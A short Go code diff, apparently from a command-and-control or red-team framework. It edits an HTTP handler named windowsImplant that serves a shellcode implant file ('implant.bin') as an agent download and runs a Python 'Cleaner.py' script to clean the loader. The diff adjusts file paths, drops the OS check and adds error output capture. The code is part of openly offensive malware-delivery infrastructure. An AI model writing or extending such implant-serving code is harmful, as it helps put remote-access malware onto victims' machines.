@@ -5,16 +5,15 @@ import (
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
-	"log"
 	"net/http"
 	"os"
 	"os/exec"
-	"runtime"
+	"bytes"
 )
 
 func windowsImplant(w http.ResponseWriter, r *http.Request) {
 	fmt.Println("Agent getting downloaded")
-	filepath := "..\\OutputShellcode\\implant.bin"
+	filepath := "OutputShellcode/implant.bin"
 	if _, err := os.Stat(filepath); os.IsNotExist(err) {
 		fmt.Println("File does not exist:", err)
 		http.Error(w, "File not found.", http.StatusNotFound)
@@ -24,15 +23,14 @@ func windowsImplant(w http.ResponseWriter, r *http.Request) {
 
 	fmt.Println("Cleaning loader...")
 	var cmd *exec.Cmd
-	if runtime.GOOS == "windows" {
-		cmd = exec.Command("cmd", "/c", "python ..\\Encryption\\Cleaner.py")
-	} else {
-		cmd = exec.Command("/bin/bash", "python ../Encryption/Cleaner.py")
-	}
-
-	err := cmd.Run()
-	if err != nil {
-		log.Fatal("Error: ", err)
+	cmd = exec.Command("/bin/bash", "-c", "python3 Cleaner.py")
+	var stdout, stderr bytes.Buffer
+	cmd.Stdout = &stdout
+	cmd.Stderr = &stderr
+	err2 := cmd.Run()
+	if err2 != nil {
+		fmt.Println("Error:", err2)
+		fmt.Println("Stderr:", stderr.String())
 	}
 }
 
